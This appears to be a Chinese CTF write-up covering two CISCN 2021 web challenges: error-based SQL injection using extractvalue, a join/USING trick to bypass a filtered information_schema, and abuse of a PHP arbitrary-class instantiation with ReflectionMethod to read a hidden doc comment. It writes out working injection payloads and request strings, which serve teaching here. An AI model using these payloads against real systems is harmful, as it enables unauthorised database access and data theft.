---
title: CISCN线上赛库存
date: 2021-08-18 17:21:24
categories: ['CTF']
tags: ['web','sql注入','php原生类']
---

# easy_sql

在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是**括号单引号闭合**

> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1') LIMIT 0,1' at line 1

过滤的字符有union，所以尝试报错注入，查询版本号。

```
admin') and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
```

接下来想要通过**information_schema**库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。

最后参考了网上的一篇文章：[mysql 注入 information_schema_绕过IDS过滤information_schema继续注入](https://blog.csdn.net/weixin_35867608/article/details/113937118)，模仿文章构造payload

```
admin') and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
```

回显为：Duplicate column name 'no'，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段

```
Duplicate column name '28d9f90a-4120-4ee8-9079-4e7613699510'
```

直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了

```
admin') and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
```

flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}

# easy_source

使用目录扫描，扫描到了`.index.php.swo`

```
本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？
<?php
class User
{
    private static $c = 0;

    function a()
    {
        return ++self::$c;
    }

    function b()
    {
        return ++self::$c;
    }

    function c()
    {
        return ++self::$c;
    }

    function d()
    {
        return ++self::$c;
    }

    function e()
    {
        return ++self::$c;
    }

    function f()
    {
        return ++self::$c;
    }

    function g()
    {
        return ++self::$c;
    }

    function h()
    {
        return ++self::$c;
    }

    function i()
    {
        return ++self::$c;
    }

    function j()
    {
        return ++self::$c;
    }

    function k()
    {
        return ++self::$c;
    }

    function l()
    {
        return ++self::$c;
    }

    function m()
    {
        return ++self::$c;
    }

    function n()
    {
        return ++self::$c;
    }

    function o()
    {
        return ++self::$c;
    }

    function p()
    {
        return ++self::$c;
    }

    function q()
    {
        return ++self::$c;
    }

    function r()
    {
        return ++self::$c;
    }

    function s()
    {
        return ++self::$c;
    }

    function t()
    {
        return ++self::$c;
    }
    
}

$rc=$_GET["rc"];
$rb=$_GET["rb"];
$ra=$_GET["ra"];
$rd=$_GET["rd"];
$method= new $rc($ra, $rb);
var_dump($method->$rd());
```

看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个`$ra`、`$rb`

，源码虽然给出了`User`类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。

根据提示

> 虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？

应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个`ReflectionMethod`类，并且`ReflectionMethod`类中刚好有一个`getDocComment` 方法可以获得注释：

> 简介：**ReflectionMethod** 类报告了一个方法的有关信息。类报告了一个方法的有关信息
>
> ReflectionFunctionAbstract::getDocComment — 获取注释内容

源码中初始化创建对象为`new $rc($ra, $rb)`，传递了两个参数，`ReflectionMethod`类的初始化魔术方法也提供了两个参数

> public ReflectionMethod::__construct ( [mixed](https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed) `$class` , string `$name` )

所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释

payload

```
?rc=ReflectionMethod&ra=User&rb=q&rd=getDocComment
```

结果

```
你能发现我吗string(152) "/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */"
```



题外话：在尝试过程中还发现了另一个类`ReflectionClass`

> 简介：**ReflectionClass** 类报告了一个类的有关信息。

和上面的那个类对比，两个类研究的对象不一样**ReflectionMethod**研究的是类中的方法，**ReflectionClass** 研究的是类。

这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。

